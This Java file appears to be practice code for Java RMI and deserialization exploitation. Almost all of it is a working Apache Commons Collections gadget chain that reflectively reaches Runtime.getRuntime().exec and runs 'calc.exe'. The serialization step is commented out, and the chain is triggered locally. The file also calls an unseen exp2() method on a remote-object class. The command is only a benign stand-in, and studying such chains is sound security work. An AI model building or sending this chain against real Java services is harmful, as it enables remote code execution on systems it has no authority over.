package RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.rmi.RemoteException;
import java.util.HashMap;
import java.util.Map;

public class TestMain {
    public static void main(String[] args) throws Exception {
        RemoteHelloImpl remoteHello = new RemoteHelloImpl();
        remoteHello.exp2();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe",}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut;

        //            objOut = new ObjectOutputStream(out);
//            objOut.writeObject(transformerChain);

        transformerChain.transform(null);

    }
}
